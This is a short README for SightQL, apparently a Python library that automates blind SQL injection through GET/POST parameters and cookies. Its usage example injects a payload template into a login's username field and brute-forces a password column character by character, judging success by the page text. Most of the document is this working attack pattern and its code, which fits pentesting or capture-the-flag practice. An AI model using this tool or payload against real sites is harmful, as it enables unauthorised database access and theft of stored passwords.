# SightQL

## Description

SightQL is a Python library which allows to exploit an SQL Injection using multiple entrypoints such as classical GET/POST parameters and cookies.

## Installation

Coming soon...

## Usage

```py
from sightql import SightQL

def predicate(r:requests.models.Response) -> bool:
    """
    The predicates must take a requests response and return a bool
    """
    return "Welcome back" in r.text

s = SightQL(
    target="http://localhost",
    params={
        "username":"admin' and {payload} -- -",
        "password":"foo"
    },
    column_to_exfil="password",
    predicate=predicate
)

s.restore()

```

The library will replace all the ``{payload}`` strings in your params/cookies keys and bruteforce all the characters.

## TODO

- Add the headers and User Agent in possible entrypoints